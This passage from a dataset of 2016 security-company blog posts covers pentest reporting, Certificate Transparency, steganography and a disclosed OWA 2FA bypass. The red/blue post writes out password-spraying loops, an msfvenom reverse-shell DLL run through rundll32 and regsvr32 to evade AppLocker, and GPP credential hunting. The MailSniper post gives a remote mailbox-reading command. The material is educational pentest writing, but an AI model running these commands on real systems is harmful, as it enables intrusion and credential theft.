to ensure that our customers can grasp the concepts illustrated in our penetration testing reports. Applying the techniques outlined above can help to ensure that we understand and satisfy that responsibility. Our reports are typically the only artifact that remains after the test is complete. They illustrate business value to the organizations that we test. By distinguishing ourselves through comprehensive and accurate reporting we can keep businesses coming back for service.\nIf you are interested in an excellent writing reference, check out \u201cThe Tongue and Quill.\u201d  It is a very comprehensive writing style guide published by the US Air Force. I have had a copy on my bookshelf since 1993 and I reference it often.  A PDF file is available at:\nhttp://static.e-publishing.af.mil/production/1/saf_cio_a6/publication/afh33-337/afh33-337.pdf\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Red + Blue = Purple\"\nTaxonomies: \"Author, Blue Team, David Fletcher, Red Team, Blue Team, Conference Talk, GrrCon, Purple Team, Red Team, Red Team vs. Blue Team\"\nCreation Date: \"Wed, 26 Oct 2016 16:01:05 +0000\"\nDavid Fletcher & Sally Vandeven // \n\nWe gave a presentation at the GrrCon hacker conference in Grand Rapids, MI on October 6, 2016. The presentation was a dialogue meant to illustrate the friendly banter between a blue-teamer trying to protect a network and a red-teamer trying to attack it.  The topics that were discussed are some of the more prevalent ways BHIS has found to gain access, escalate privilege, and dominate in typical enterprise environments.\n\nWe also talked about some of the things the blue team can do to prepare for a pentest and make the testers job that much harder.  Here is the presentation with some supporting material below including command examples and references regarding the topics discussed during the presentation.\n\nhttps://youtu.be/und5ZsO0F7s\n\nPassword Spraying \n\nThis refers to a password guessing attack on an enterprise.  The pentester creates a list of account names either using the command line and querying Active Directory or by harvesting usernames from open source intel.  Then a common password is used, say \u201cAutumn2016\u201d and a login is attempted for each username on the list.  Because of account lockout policies this has to be done with care so that the organization\u2019s users do not get locked out of their accounts.  Guess one single password for each user per observation window so you don\u2019t risk locking out accounts.\n\nHow to launch a password spray attack on a domain from the command line.\n\nFirst check the password policy, which includes the lockout settings.\n\nC:\\> net accounts /domain\n\nThe example below shows a domain password policy. For a password spray on this network, we would select simple eight character passwords like Fall2016 or Summer16 (users tend to stick to the minimum length) and we would spray one password every ten minutes. The \u201cLockout observation window\u201d defines how long after the last incorrect password before the bad-password-counter is reset to zero. So after one incorrect password the bad-password-count is one but if we wait for ten minutes, that count gets reset to zero and we can guess again.  This greatly reduces the chances of locking out accounts.  There are some issues though with services accounts that may not be subject to the same lockout rules. Additionally, the bad-password-count does not get replicated between redundant DCs so if the account is authenticating to different DC\u2019s at each login there could be a conflict. So our rule of thumb is one guess per observation window.\n\nOnce you know the password policy you can create a userlist using either the wmic utility (strip off the first line from the file that gives the column header) or PowerShell. In our experience the PowerShell command is faster but you may not always have access to PowerShell so both are shown below.\n\nC:\\> wmic useraccount where (domain='%USERDOMAIN%') get Name > userlist.txt\n\nPS C:\\> ([adsisearcher]\"objectCategory=User\").Findall() | ForEach\n{$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII\n\nNote: Above is a one line PowerShell command with a space between \u201cForEach\u201d and \u201c{$\u201d\n\nThen test each credential with the following FOR loop that mounts the share \\\\\u2019%LOGONSERVER%\u2019\\IPC$ using each username in userlist.txt and the password which you have placed in the file \u201cpass1.txt\u201d:\n\n@FOR /F %n in (userlist.txt) DO @FOR /F %p in (pass1.txt) DO @net use \n%LOGONSERVER%\\IPC$ /user:%USERDOMAIN%\\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && \n@net use /delete \\\\DC1\\IPC$ > NUL\n\nScript it!\n\nYou can also use Beau Bullock\u2019s PowerShell script Invoke-DomainPasswordSpray.ps1. This script will do it all for you! All you have to do is point it at a user list and give it a password -- in this case \u201cAutumn2016\u201d.  If you give a list of passwords as an argument, the script will guess one password for each account per observation window.  Actually, you don\u2019t even have to give it a user list. If you don\u2019t it will generate a list at runtime. Sweet.\n\nPS C:\\> Invoke-DomainPasswordSpray -Domain %USERDOMAIN% -UserList userlist.txt \n-Password Autumn2016\n\nReferences\n\nDomainPasswordSpray.ps1 script: https://github.com/dafthack/DomainPasswordSprayPassword Spraying an OWA Portal blog post: http://www.blackhillsinfosec.com/?p=5089\n\nAppLocker Bypass\n\nSecondary Execution\n\nWhen a running process starts up a second process, that second process is started by what is referred to as \u201csecondary execution\u201d and it is not detected by AppLocker. This means that AppLocker rules do not get applied.  In other words, it is a way to get an executable file to run even if it has NOT been explicitly allowed by AppLocker.  There are a couple of ways to accomplish secondary execution. The first is using RUNDLL32.EXE and the second is by using REGSVR32.EXE.  Examples of both are shown below.\n\nUse Metasploit\u2019s msfvenom utility to create a malicious DLL file. In this case the DLL file will make an outbound connection using HTTPS to a listening server on IP address 192.168.2.10:443.  The DLL file can be executed using either RUNDLL32.EXE or REGSVR32.EXE.\n\n# msfvenom \u2013p windows/meterpreter/reverse_https  -f  dll  LHOST=192.168.2.10  \nLPORT=443  > C:\\temp\\malicious.dll\n\nC:\\Windows\\System32\\rundll32.exe C:\\temp\\malicious.dll,Control_RunDLL\n\nOR\n\nC:\\> regsvr32.exe  /s  /u  malicious.dll\n\nAnother AppLocker bypass is to use InstallUtil.EXE to directly access .NET functions and fly under the AppLocker radar.  See \u201cPowerShell w/o PowerShell\u201d BHIS blog post referenced below.\n\nThird-Party Command Shells\n\nAs a pentester, you may be prevented from running cmd.exe but you have other options.  You could try running a third-party command shell.  There are several out there but we have tested only one and it worked perfectly.  It is a command shell that comes with the open-source Windows-like operating system ReactOS.  In the case that AppLocker rules prevent execution of the third-party shell, convert the executable to a DLL and use the RunDLL32.exe method described above. You can also download an already converted cmd.dll using the link to a post by Didier Stevens in the references.\n\nReferences\n\nPowerShell without PowerShell - http://www.blackhillsinfosec.com/?p=5257\n\nApp Whitelisting Bypass - http://subt0x10.blogspot.com/2016/04/bypass-application-whitelisting-script.html\n\nOpen Source Windows-like OS - https://www.reactos.org/\n\nOpen Source Windows-like OS - https://en.wikipedia.org/wiki/ReactOS\n\nHow to convert EXE to DLL - https://blog.didierstevens.com/2010/02/04/cmd-dll/\n\nPrivilege Escalation\n\nThere are many great tools that we use all the time to help with privilege escalation within a Windows domain.\n\nGPP (Group Policy Preferences ) was introduced by Microsoft in 2008.  One of the things often found in GPP preference files are encrypted privileged credentials in order to script administrative tasks. This became a problem because the static symmetric AES encryption key used for the password was published, so credentials found in the files can be easily decrypted. These credentials are definitely what we consider low hanging fruit and are one of the first things we check for on a pentest.  Here is how simple it is:\n\nOpen up a command shell and run the following command:\n\nC:\\> findstr /S cpassword %logonserver%\\sysvol\\*.xml\n\nIf you get any hits that contain an encrypted looking value in the cpassword property item just decrypt it to reveal the cleartext password and try using the credentials.  Use gpp-decrypt.rb to decrypt.  You could also use the PowerSploit module Get-GPPPassword or the Metasploit module gpp to find and decrypt in one shot.\n\nReferences\n\nhttps://blogs.technet.microsoft.com/grouppolicy/2009/04/22/passwords-in-group-policy-preferences-updated/\n\nhttp://tools.kali.org/password-attacks/gpp-decrypt\n\nhttps://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1\n\nhttps://www.rapid7.com/db/modules/post/windows/gather/credentials/gpp\n\nPowerUp will find common misconfigurations that could allow privilege escalation. This PowerShell script will check for misconfigurations like Weak Service Permissions, Unquoted Service Paths, Hijackable DLLs and other things.  We show how to run the PowerUp module in PowerShell here but PowerShell Empire also has the module builtin so when you establish an agent using Empire you can invoke it remotely.\n\nPS C:\\> import-module ./powerup.ps1\n\nPS C:\\> Invoke-Allchecks\n\nThe use one of the builtin modules in PowerUp to exploit any discovered vulnerabilities.\n\nUse ShareFinder and FileFinder modules in PowerSploit\u2019s PowerView module to scour the domain looking for juicy files that you have access to. By default, FileFinder will flag files that files with 'pass', 'sensitive',  'secret', 'admin', 'login', or 'unattend*.xml' in the name but search criteria is configurable.\n\nPS C:\\> Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 | \nOut-File -Encoding Ascii interesting-shares.txt\n\nPS C:\\> Invoke-FileFinder -ShareList .\\interesting-shares.txt -Verbose -Threads \n20 -OutFile juicy_files.csv\n\nBloodhound is a tool that automates the process of finding a path to an elevated AD account. It uses PowerShell to query Active Directory and then creates a graph showing the available accounts/computers that the attacker can gain access to in order to dump credentials from memory (for example with Mimikatz). The dumped credentials will provide privilege escalation perhaps all the way up to domain administrator.\n\nRestricting Client to Client Traffic - We have only worked with a couple of organizations that implement this level of control and it was very effective in restricting our ability to pivot. Unfortunately, we do not have many references to offer regarding how to implement this level of security but it is reasonable to assume that granular NTFS permissions and host-based firewall rules are part of the recipe.\n\nW^X- Refers to only allowing users to write in locations that are not executable and only allow applications to be executed in locations where they are not allowed to write.  The latter can be enforced with AppLocker. In fact, default AppLocker rules allow execution only from the Program Files directory and the Windows directory, which users by default do not have write access to.  It would be worth auditing those locations for any permission changes when implementing AppLocker.\n\nReferences\n\nPowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\n\nPowerView - https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\n\nEmpire - https://github.com/adaptivethreat/Empire\n\nBloodhound - https://www.youtube.com/watch?v=MYxk73DsGQI\n\nBloodhound - https://wald0.com/?p=68\n\nMimikatz - http://www.blackhillsinfosec.com/?p=4667\n\nLAPS - https://technet.microsoft.com/en-us/mt227395.aspx\n\nActive Defense \n\nThis refers to making the attacker\u2019s job more difficult and confusing.  It does not refer to \u201chacking back\u201d.  (Hacking back by most definitions would be illegal)  Injecting a little bit of chaos and unpredictability goes a long way to confounding and slowing down attackers.  Most people have heard of honeypots but what about honey files, honey accounts, honey tokens and other lovely goodies. ADHD is an active defense distribution put together by BHIS and available for free here.\n\nWeb Bugs are hidden elements in a web page like a 1X1 pixel image that gets loaded from a web bug server.  The server collects identifying information like IP address, User Agent and Timestamp. The web bug can be embedded in a .DOC file with a juicy sounding file name like ProjectedSalaries-2017.doc or Passwords.doc.  When the attacker takes the bait, the identifying info is logged.\n\nWeblabyrinth creates a maze of fake web pages with the goal of confusing automated web scanners.\n\nUse Honeyports to catch and blackhole attackers when they try to connect to the fake services listening on the network with the tool Artillery by TrustedSec.\n\nUse Kippo to monitor brute force SSH attacks and confuse the attackers by making it appear that they are really connected to an SSH server.\n\nAnd many more in ADHD.\n\nReferences\n\nList of Tools in ADHD -  https://github.com/adhdproject/adhdproject.github.io/blob/master/index.md\n\nAbout ADHD -  http://www.blackhillsinfosec.com/?page_id=4419\n\nADHD Install instructions -  http://www.blackhillsinfosec.com/?p=5234\n\nArtillery - https://www.trustedsec.com/artillery/\n\nWeb Bugs - https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/WebBugServer.md\n\nWeblabyrinth - https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Weblabyrinth.md\n\nHoneyports - https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/HoneyPorts.md\n\nKippo - https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Kippo.md\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Certificate Transparency Means What, Again?\"\nTaxonomies: \"Author, Brian King, InfoSec 301, Bad Certificates, Certificate Transparency, Chrome, Google\"\nCreation Date: \"Fri, 28 Oct 2016 15:06:17 +0000\"\nBrian King //\n\nNews from Google this week says that Chrome will start enforcing Certificate Transparency a year from now.\n\nhttps://groups.google.com/a/chromium.org/forum/#!topic/ct-policy/78N3SMcqUGw\n\nThis means that when Chrome contacts a website, if it finds that the certificate does not adhere to Transparency requirements, Chrome won\u2019t load the page. They\u2019re announcing it now so interested parties can comment and possibly influence the details of how that will work in practice.\n\nSo what is Certificate Transparency, and why should you care?\n\nCertificate Transparency is a way to detect Bad Certificates. A Bad Certificate is one that was issued incorrectly in some way but is not a forgery. Our existing public-key cryptography and trusted CA stores in your browser already detect forgeries, as well as signatures that can\u2019t be validated. That\u2019s what triggers the familiar certificate warning in your web browser.\n\nIn this other sense, a Bad Certificate is one that was issued without the CA\u2019s valid assent, or without having properly verified that the requestor had authority to act on behalf of the domain name in question. Root causes for these kinds of problems include forged identity documents, hijacked verification steps, compromised root certificates, malicious insiders, and rouge or misbehaving certificate authorities.\n\nCertificate Transparency is accomplished through the use of independent, cryptographically-verifiable, append-only logs that provide information about certificates. Anyone can submit a certificate to these logs, and anyone can query them to see if a particular certificate is in there. There will be lots of these log servers, independently operated. Certificate Authorities will likely run their own, and auto-submit their certificates as they issue them, but anyone can run one. Google\u2019s announcement means that Chrome will complain (in some fashion) if it gets a certificate from a website and cannot find that certificate properly registered in one of these logs.\n\nMonitoring services will keep an eye on these log servers. These will look for certificates that are \u201cwrong\u201d in some way. Maybe a server certificate that has the CA bit set, and so can sign other certificates. Maybe a certificate is signed by a legitimate CA\u2019s root certificate but was not actually issued by that CA. This is one reason a CA would run their own log server: if they see a certificate signed with their keys appear in someone else\u2019s log server but not their own, it\u2019s time to hit the panic button - someone has misused their signing keys.\n\nAuditing services will make sure that the log is functioning properly at an administrative level. They will verify that the log hasn\u2019t been tampered with, for example, by verifying the cryptographic signatures. These will also lookup individual certificates to see if they exist in a given log. Your browser will have a built-in, limited purpose auditor.\n\nIt seems likely that all three of these roles will be carried out by certificate authorities, browser vendors, academics, and researchers.\n\nThis is a giant leap towards independent verification of SSL/TLS security and provides a strong supplement to the blind trust we all implicitly grant to the long, long list of certificate authorities built into our browsers.\n\nIf you operate a web site or any service secured by certificates, go learn more: https://www.certificate-transparency.org/\n\nThis all came to my attention in the Feisty Duck newsletter that Ivan Risti\u0107 publishes - a fantastic place to keep up with SSL/TLS issues. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Happy Halloween from BHIS\"\nTaxonomies: \"Fun & Games, happy halloween\"\nCreation Date: \"Mon, 31 Oct 2016 17:24:47 +0000\"\nMelisa Wachs //\n\nEveryone seems to hates clowns these days. With all the crazy clown sightings, and banning of clown costumes at parades and schools, I got to thinking that this whole scary clown thing is way overdone. That was until I remembered why I, too, hate clowns.\n\nFeeling mischievous this Halloween, I decided to have some fun with family.\n....And by family, I mean John.\nI thought I might share a gem from the Strand hutch I dug up this summer.\n\nMeet John Strand - Maybe the Last, Lonely Innocent Clown\n__________\nP.S. - I hope you enjoy because I\u2019m actually going to be in serious trouble for this one. John\u2019s going to be pissed. Here\u2019s one for all the times I had to endure the \u201cnot touching you\u201d game on car trips.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Steganography: The Art and Science of Hiding Things in Other Things  Part 3\"\nTaxonomies: \"How-To, compression, hiding, jpg, puppies, steganography\"\nCreation Date: \"Fri, 04 Nov 2016 15:00:05 +0000\"\nDakota Nelson * //\n\nThis is part three of a four part series. In part 1, we covered the basics of image formats and found a place to hide data in images. In part 2, we actually wrote code to steganographically encode data into an image and then extract it without making the image look different.\n\nTired of this picture yet?\nWe ran into a problem in part 2, though - compression. When images are compressed, our carefully hidden data can be damaged. We fixed that by repeating every bit in the message 9 times, but we can do better. This post will cover how we can use some math, in the form of error correcting codes, to hide more bits of data in each image.\nOur friend Wikipedia gives us a good definition of what an error correcting code is:\n\n\u201cAn error-correcting code (ECC) is a process of adding redundant data to a message, such that it can be recovered by a receiver even when a number of errors (up to the capability of the code being used) were introduced.\u201d\n\nThe repetition we used earlier is the simplest possible ECC - we send redundant data, repeating ourselves over and over, so that even if some of the bits are wrong we can still receive the message.\nBefore we start figuring out something better, though, we need to define our problem. We know that compression destroys data, but how?\nFirstly, we can say that compression introduces *noise* - in other words, some bits are not what we expect them to be. For instance, we might put the message `1101` in and get `1100` out - in which case, we would say that the last bit was \u201cflipped\u201d from a 1 to a 0. Now that we know we have some noise, how can we define it?\nWell, we have several options here. You can read papers, like [this 8 page one](http://csrc.nist.gov/nissc/1996/papers/NISSC96/paper014/STEGOX.PDF) written by someone at the Fleet Information Warfare Center, or you can make some assumptions and see if they work.\nLet\u2019s compromise and make some assumptions that are informed by reality. They might not be 100% right, but they\u2019re right enough. So, for our sake, we can assume:\n1. Random, position-independent noise: there are no specific patterns in the noise; any given bit has the same chance of being flipped as any other bit of the same significance. This means it doesn\u2019t matter *where* in the image we encode data; a pixel in the bottom left hand corner of the image (for example) is as likely to be changed as a pixel in the middle.\n2. More significant bits have less noise: the least significant bit of any pixel is the most likely to be flipped since compression tries to eliminate useless data, and the chance that a bit will be flipped decreases as the bits become more significant.\n3. The noise is binary symmetric: this is a fancy way of saying that the noise is unbiased and evenly distributed - a zero is just as likely to be flipped as a one.\nRather than spend a lot of time uploading and downloading images from web sites where they\u2019ll be compressed, we can simulate this type of noise by randomizing some bits in the image. This lets us use code, which is nice and controllable so we can do lots of testing easily.\nHere\u2019s our image before and after blurring:\n\nIt may not look very different, but it turned `we're going to hide this message in an image!` into `we're eking to hide this message in an image`  (without the exclamation point on the end), so it\u2019s definitely causing some damage.\nThe challenge now is to be able to extract data from the blurred image, even though there\u2019s noise. The repetition from part 2 works, but having to repeat every bit 9 times means we can\u2019t transfer nearly enough data. We can do better.\nBefore we can dive into error correction, though, we need to talk about parity bits. Essentially, a parity bit adds a check to any given binary string that tells us whether the number of 1-bits in the string is odd. For instance: the string `000` has no 1-bits, so its parity bit would be 0 (leaving us with the final string `0000` ). In contrast, the string `010` has an odd number of 1-bits, so its parity bit is 1, leaving us with `0101` . You\u2019ll notice that this means every string has an even number of ones in it once the parity bit is added.\nThe process is:\n1. Compute parity bits based on your message. If it has an odd number of `1` values, the parity bit is `1` , otherwise the parity bit is `0` .\n2. Put those parity bits into the message; they\u2019re frequently on the end, but it doesn\u2019t actually matter where they are so long as the receiver knows where to find them.\nWhy do we do this? Simple - if a bit gets flipped somewhere in the string, we can tell something is wrong by checking the parity bit (if the string `0101` from above comes across as `1101` , we know that the parity bit of `110` should be 0 - but it\u2019s 1, so something must be wrong). Unfortunately, this only tells us that something is wrong - not what. We have no way of knowing which bit was flipped.\nEnter Richard Hamming, who invented Hamming codes, a way of combining parity bits to both *detect* and *correct* errors. Hold on, this is about to get awesome (and really math-y).\nFor this next part, let\u2019s assume you\u2019re trying to send 4 bits of data, and you know (somehow) that you won\u2019t have more than one error in them.\nSay you\u2019ve got your usual parity bit with the 4 bits of data. If there\u2019s an error, how can you tell which bit is wrong? You can\u2019t - one of the four is flipped, but there\u2019s no way to know which. (Note that the circles in these graphics each represent a parity group - once all the parity bits are computed and added, each will have an even number of ones in it. This means that if a circle *doesn\u2019t* have an even number of ones in it when we receive the message, we know something is wrong.)\n\nIf you just add another parity bit, that\u2019s great, but all you\u2019ve done is repeated the parity bit - which is useful, since it means you can maybe tell if either of them is wrong by checking the other. But this mostly seems like a waste. You still can\u2019t tell which data bits have been flipped if anything goes wrong - the second parity bit provides no new information.\n\nLet\u2019s try something weird. What if you exclude the 4th data bit from the first parity bit? If either of the first three data bits are flipped, the first parity bit will tell us, and if any of them are flipped, the second parity bit will tell us as usual, but\u2026 if the first parity bit is wrong, it can be any of the first three data bits that are wrong, but if the second parity bit is wrong, it can be any of the four. Seems like we\u2019re kind of narrowing in on something here.\n\nIf we take this one step further and keep shrinking the number of bits covered by the first parity bit, we get to the layout below. We\u2019ve done an incredible thing here! If both parity bits are wrong, we know that the first data bit is wrong - not just \u201ca bit,\u201d but *exactly which bit is wrong!*\n\nIf you take this further, you can end up here:\n\nSeriously, take a minute to look at the image above. This means that if *any one of the data bits is flipped, you can tell which it is and fix it*, because you know that each circle must contain an even number of ones. By extending this idea, you can play with the number of parity bits and data bits to handle different levels of error - broadly speaking, more parity bits help you correct more errors, but it means you have less space for data.\nIf error correcting codes are still confusing, think of it this way - we\u2019ve created a bunch of potential messages which are *invalid to receive*, so that if you get them, you know something is wrong (the valid messages are known as \u201ccode words\u201d - the \u201ccode\u201d in \u201cerror correcting codes\u201d). When you get one of these messages that you know is wrong, you can correct for errors by choosing the valid code word that is most similar to what you received (which means we want code words to be as different as possible so that it\u2019s obvious which code word any given incorrect message is supposed to be).\nThis is the math behind correcting errors in a much more efficient way than the simple repetition we\u2019ve used before - in our case, we can fit more than four times the amount of data! Next time, we\u2019ll take this math and put it to work.\n\n________\n \n*Dakota runs Striker Security - you can find more of his writing at https://strikersecurity.com/blog*\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bypassing Two-Factor Authentication on OWA & Office365 Portals\"\nTaxonomies: \"Author, Beau Bullock, External/Internal, Red Team, 2FA, Beau Bullock, Email, EWS, MailSniper, Microsoft, Outlook, OWA, OWA portal, Vulnerabilities\"\nCreation Date: \"Wed, 02 Nov 2016 15:00:10 +0000\"\nBeau Bullock // \n\nFull Disclosure: Black Hills Information Security believes in responsible disclosure of vulnerabilities. This vulnerability was reported to Microsoft on September 28th, 2016. As of the publication date of this post(November 2nd, 2016) Microsoft have not responded with any updates other than to say there are no updates. The full timeline of this disclosure can be found in a section at the end of the blog post.\n\nUPDATE as of 3pm MST 11/2/16: This blog post demonstrates a two-factor authentication bypass technique against Microsoft Outlook Web Access where the third-party 2FA vendor was DUO Security. It should be stated that this is NOT a vulnerability in DUO Security's product. It is a problem in which Microsoft Exchange server exposes the Exchange Web Services interface unprotected by 2FA alongside OWA. \n\nUPDATE as of 11:15am EST on 11/4/16 BHIS has retested the portion of this article detailing a bypass against Office365 Multi-Factor Authentication and it does indeed appear to not work. Some individuals have pointed out that they were getting 401 Unauthorized error messages when connecting in via EWS with MFA fully enabled on a user. When testing against the initial test user BHIS tested against EWS on O365 it now produces the same 401 error results when using a password to authenticate. BHIS believes that the results obtained previously were due to a delay in which Office365 MFA was denying access to Exchange Web Services after recently enabling it for a user. A video demonstrating this has been put together here: https://youtu.be/Bb_T3ILfllU\n\nAdditionally, a very detailed post regarding the various protocols of Exchange has been put together here: http://exchangeserverpro.com/exchange-web-services-bypass-multi-factor-authentication/\n\n_______\n\nORIGINAL POST: At DerbyCon 6.0 I released a tool called MailSniper for searching mailboxes for sensitive data in a Microsoft Exchange environment. MailSniper utilizes Exchange Web Services (EWS) when connecting to an Exchange server to retrieve messages from a user\u2019s inbox. EWS is a web-based API enabled on Exchange servers that Microsoft recommends customers use when developing client applications that need to interface with Exchange. The API allows for applications to have the ability to interact with email messages, contacts, calendar, and more from user\u2019s mailboxes.\n\nWhile at DerbyCon I sat in on a talk called \u201cOutlook & Exchange for the Bad Guys\u201d by Nick Landers. It was an awesome talk that I highly recommend checking out. During his talk Nick received a question from the audience in regards to whether two-factor authentication (2FA) would stop the attacks he mentioned during the talk. Nick replied with a statement I found very interesting. He said \u201cI\u2019ve seen some organizations lockdown 2FA on OWA. So when you go to the Outlook Web Access you have to supply a token before you can finish logging in. That wouldn\u2019t stop a lot of these attacks because two-factor auth doesn\u2019t apply to EWS or the NTLM auth on the Autodiscover page.\u201d\n\nI thought to myself if 2FA on OWA doesn\u2019t apply to EWS, then it should be possible to read emails using EWS with MailSniper, completely bypassing the 2FA security control.\n\nTo test this theory I set up an Internet-facing Outlook Web Access portal, and installed a popular 2FA software (DUO for Outlook) on it. I setup the DUO mobile application on my phone, and logged into our OWA portal using a test user account called \u2018vladi@eldershogun.com\u2019.\n\nStandard OWA Login Page\n\nAfter syncing DUO with my phone I could now receive push notifications upon logging in to confirm my second factor during authentication. At this step, if I was a remote attacker and did not have the phone synced with the DUO 2FA software, I could not proceed any further with logging into the OWA portal.\n\nDUO 2FA Screen\n\nPreviously, with MailSniper it was only setup to work on an internal domain. I modified the code slightly to add in a \u201c-Remote\u201d switch that will allow the Invoke-SelfSearch function to work remotely across the Internet. A few things are needed in order to access a mailbox remotely. First, an external email server for the target organization needs to be located. In many cases these can be discovered using Autodiscover or by brute forcing subdomains like mail.domain.com, owa.domain.com, webmail.domain.com, etc. The mail server needs to be specified with the \u2018-ExchHostname\u2019 option. If no \u2018-ExchHostname\u2019 option is specified Invoke-SelfSearch will attempt to Autodiscover the mail server. Secondly, a valid set of user credentials must be gathered. For some ideas on doing this remotely see this blog post.\n\nOnce the Exchange server hostname, and credentials of the target user are obtained the following command can be used to search an exchange mailbox remotely over the Internet:\n\nInvoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com \n-Remote\n\nOnce this command is run a credential box will pop up requesting the credentials of the target user. Depending on how the organization setup internal User Principal Names (UPN\u2019s) the target user\u2019s email address or domain\\username can be entered into the username box.\n\nAfter the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user\u2019s inbox for key terms (by default \u201c*pass*\u201d, \u201c*creds*\u201d, and \u201c*credentials*\u201d).\n\nI tested this against the account that was setup to be protected by DUO 2FA. MailSniper was able to successfully read and search through emails of this account completely bypassing the two-factor protection.\n\nTo further validate that this is not simply a problem with the DUO 2FA software, BHIS set up an Office365 instance and utilized Microsoft\u2019s own Azure Multi-Factor Authentication (MFA) to protect a user account from accessing the \u201cOutlook Mail\u201d portion of Office365.\n\nTo demonstrate this I first logged in to my test user\u2019s account at the standard Office365 login portal.\n\nAfter entering the correct password the additional Microsoft Azure Multi-Factor authentication portion is necessary. In this case I had it send me a text message to deliver the verification code.\n\nAfter the MFA verification code has been entered the test user was now able to access the inbox at Outlook.Office.com.\n\nUsing the method described previously to bypass 2FA it is still possible to read emails of the allegedly protected account through Exchange Web Services. By directing MailSniper to authenticate to outlook.office365.com as the ExchHostname the mailbox of the target user can still be accessed bypassing the two-factor protection.\n\nDemo Video\n\nRecommendations\n\nI wish the easy answer for fixing this would be disabling Exchange Web Services but that could break many things. For example, from what I can tell Outlook for Mac utilizes Exchange Web Services exclusively to connect to Exchange. So if you have Macs in your environment disabling EWS probably isn\u2019t an option. The same would go for any custom apps that utilize it. So, in the short term lockdown OWA to only be accessed from an internal network, and require users VPN in to access it. It appears that it is possible to lockdown Exchange Web Services manually for specific user accounts or even for the entire organization. But, keep in mind any users that are using applications that utilize Exchange Web Services to connect to Exchange will likely break.\n\nConclusion\n\nIn conclusion, it appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange. In this post it was demonstrated that Exchange Web Services is not being protected by a popular two-factor authentication software, and it was possible to still read emails of a user after only obtaining their login credentials. Exchange has other services that might have a similar problem such as MAPI over HTTP, and Autodiscover. I tested against one third-party 2FA software, and Microsoft\u2019s own Azure Multi-Factor authentication but I\u2019d imagine others likely have the same problem.\n\nTimeline of Disclosure\n\nSeptember 28, 2016 at 1:51 PM Eastern - Reported it to Microsoft via secure@microsoft.com\n\nSeptember 28, 2016 at 10:01 PM Eastern -  Received confirmation email from Microsoft that they forwarded the report to an analyst.\n\nHello,\n\nThank you for contacting the Microsoft Security Response Center (MSRC). I have forwarded your report to an analyst and will respond with their findings.\n\nThank you,\n\nREDACTED\n\nMSRC\n\nOctober 3, 2016 at 11:15 AM Eastern - Sent a follow up email requesting status.\n\nOctober 3, 2016 at 7:41 PM Eastern - Received email saying they\u2019ve opened a case.\n\nThank you very much for your report.\n\nI have opened case 35494 and the case manager, REDACTED will be in touch when there is more information.\n\nIn the meantime, we ask you respect our coordinated vulnerability disclosure guidelines and not report this publicly until users have an opportunity to protect themselves.\n\nYou can review our bulletin acknowledgment policy at http://www.microsoft.com/technet/security/bulletin/policy.mspx and our general policies and practices at http://www.microsoft.com/security/msrc/default.mspx \n\nIf at any time you have questions or more information, please respond to this message.\n\nREDACTED\n\nMSRC\n\nOctober 11, 2016 at 8:55 AM Eastern - Sent a follow up email requesting status.\n\nOctober 11, 2016 at 4:07 PM Eastern - Received email saying they are still waiting on the product team to review the issue.\n\nHello,\n\nWe are still waiting on the product team to review the issue. I will let you know when I hear back from them and have information I can share.\n\nThanks,\n\nREDACTED\n\nMSRC\n\nOctober 21, 2016 at 3:37 PM Eastern - Sent a follow up email requesting status.\n\nOctober 24, 2016 at 4:46 PM Eastern - Received email saying still no updates.\n\nHello,\n\nAt this time I still do not have anything fruitful to share. As soon as I get an update, I will let you know.\n\nThanks,\n\nREDACTED\n\nMSRC\n\nNovember 2, 2016 - Disclosed publicly on the Black Hills Information Security blog.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Bugging Microsoft Files: Part 1 - Docx Files using Microsoft Word\"\nTaxonomies: \"Author, Ethan Robish, Red Team, Red Team Tools, ADHD, Bugging Word Files, Microsoft, MS Word, Pentesting, Web Word Bugs, Word\"\nCreation Date: \"Mon, 07 Nov 2016 15:16:32 +0000\"\nEthan Robish //\n\nIf you\u2019re familiar with ADHD and Web Word Bugs, you likely already know the method to create web tracking software using .html files renamed as .doc files.  This works, but you also likely know that it makes it difficult to use existing documents, especially if you want to update the documents in the future.  In this post I\u2019m going to share a method that works with native .docx files.  It can be used with a new document or an existing one.  I thought this would be good timing considering  Jordan recently mentioned the risks of opening Office documents in his post.\nThe instructions below were made with Microsoft Word 2013 for Windows.\n\nOpen an existing document or create a new one. Place the cursor where you want to insert the tracker. You can place it anywhere, but I recommend using the header or footer as it is less likely to be accidentally changed if inserting fake content in the document later on.\nChoose the Insert Menu.\nChoose Quick Parts.\nChoose Field.\n\nThis will open a dialog window where you can choose a field.\n\nChoose IncludePicture.\nType the address for your tracking bug. You should come up with a unique name for this document so when it is opened later you can tell which document it was. The address should be similar to http://DOMAIN/index.php?id=ID&type=img but you need to replace DOMAIN and ID with your own values.\nCheck the box labeled: Data not stored with document. This tells Word to request the image every time the document is opened.\nChoose OK.\n\nYou can resize the image by selecting it and dragging the corner down.\n\nSmaller Image Not Loaded\nBy making it as small as possible, it is barely noticeable.\n\nSmallest Image Not Loaded\nSave the file and close Word.\nIn my next posts I will cover weaponizing .xlsx files and removing metadata from Office files afterwards.\nPart 2\nPart 3\nReferences:\n\nhttps://superuser.com/questions/38870/in-microsoft-word-how-can-i-link-to-an-image-from-the-web-which-updates\nhttps://www.youtube.com/watch?v=a-b6uyDL1Rg\n\n"
    },
    {
        "input": "",
        "instruction": "",
